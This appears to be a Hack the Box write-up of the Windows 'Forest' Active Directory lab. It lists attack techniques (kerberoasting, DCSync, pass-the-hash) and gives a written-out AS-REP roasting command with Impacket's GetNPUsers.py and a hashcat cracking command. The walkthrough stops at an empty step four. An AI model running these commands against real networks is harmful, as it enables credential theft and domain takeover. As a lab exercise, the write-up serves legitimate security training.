# Forest

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Easy**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

<img width="719" height="1009" alt="image" src="https://github.com/user-attachments/assets/6fff85b0-bd86-4e80-a1eb-a5faa5a6ea4f" />

2. Nmap reveals we're dealing with a Domain Controller. Since we are not given initial credentials, attempt to get hashes via ASREProasting attack using Impacket's GetNPUsers.py script

`GetNPUsers.py -request -format hashcat -outputfile asreproastables.txt -dc-ip 10.129.95.210 'htb.local/'`

<img width="721" height="123" alt="image" src="https://github.com/user-attachments/assets/b7257a49-3010-43a5-b68a-c3dbad6b2352" />

3. Crack hash using hashcat to get svc-alfresco's plaintext password

`hashcat -m 18200 asreproastables.txt /usr/share/wordlists/rockyou.txt`

4. 
